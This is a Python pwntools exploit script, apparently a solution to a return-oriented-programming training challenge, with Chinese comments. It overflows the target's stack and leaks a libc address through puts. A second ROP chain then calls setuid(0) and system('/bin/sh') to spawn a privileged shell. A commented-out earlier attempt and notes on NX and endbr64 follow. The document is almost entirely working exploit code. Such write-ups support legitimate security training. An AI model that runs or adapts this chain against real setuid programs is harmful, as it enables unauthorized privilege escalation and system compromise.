from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/return-oriented-programming-level1.0"
elf = ELF(challenge_path)
p = process(challenge_path)
libc= ELF('/lib/x86_64-linux-gnu/libc.so.6')
# ROPgadget --binary libc.so.6 --string '/bin/sh'
bin_sh = next(libc.search("/bin/sh"))
# bin_sh = 0x00000000001b45bd

# 程序中寻找一条pop rdi;ret指令的地址
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep "rdi"
pop_rdi_ret_addr = next(elf.search(asm('pop rdi;ret'), executable=True))
# 布置栈帧，先放入padding+rbp
payload = 8*p64(0) + p64(0) 
payload += p64(pop_rdi_ret_addr)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])
p.sendafter(">>> ",payload)

# 获取随机化之后的libc基地址
libc_address = u64(p.recvuntil('\n')[:-1].ljust(8, b'\x00')) - libc.sym['puts']

# 继续布置新的栈帧
bin_sh_addr = libc_address + bin_sh
system_addr = libc_address + libc.sym['system']
setuid_addr = libc_address + libc.sym['setuid']
payload2 = 8*p64(0) + p64(0) 
payload2 += p64(pop_rdi_ret_addr)
payload2 += p64(0)
payload2 += p64(setuid_addr)
payload2 += p64(pop_rdi_ret_addr)
payload2 += p64(bin_sh_addr)
payload2 += p64(system_addr)
p.sendafter(">>> ",payload2)
# 注意获得shell之后需要进入交互模式，用改了权限的shell读取flag，不然程序终止修改失效
p.interactive()

# 下面是原本的思路，懒得继续想了，直接用实验二的代码也能破解
"""
# 布置栈帧
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.recvline()
result=p.recvline()
rbp_addr=int(result[16:],16)+0x60
print(hex(rbp_addr))

payload = (b"/flag\0\0\0") + p64(rbp_addr) + 6 * p64(rbp_addr+0x10) + p64(rbp_addr+0x60) + p64(0x0040130c)
p.sendafter(">>> ",payload)
print(p.recvall())
# python3 /home/hacker/rop1.py

看汇编，最多读128个字节到栈上，但是栈只有64字节，必定会溢出，但是开启了NX没办法栈上执行shellcode，不过地址没有随机化
程序中readflag函数，但是需要设置参数
rbp-50h往上作为栈存放flag，但是如果直接跳转到read_flag，rbp只增加了10h，没办法覆盖rbp-58h的地址（最低能赋值rbp-50h），需要通过调用别的函数增加栈底

x64函数退出时，leave会将rsp设置为rbp+8，ret将rsp指向的内容赋给rip，然后rsp自增8
进入函数时，endbr64指令会修改rsp为合适的值，然后保存rbp到栈中，然后将rsp的值赋给rbp，rsp再适当减少
endbr64是一个用来对抗ROP攻击的指令，间接转移指令时，下一条指令必须是endbr64，否则会触发保护机制
所以需要使用有endbr64的ret短函数，IDA中寻找

同时还需要设置rdi的值为flag路径字符串地址，但是程序中没有pop rdi，从动态库里面找
ldd filename
"""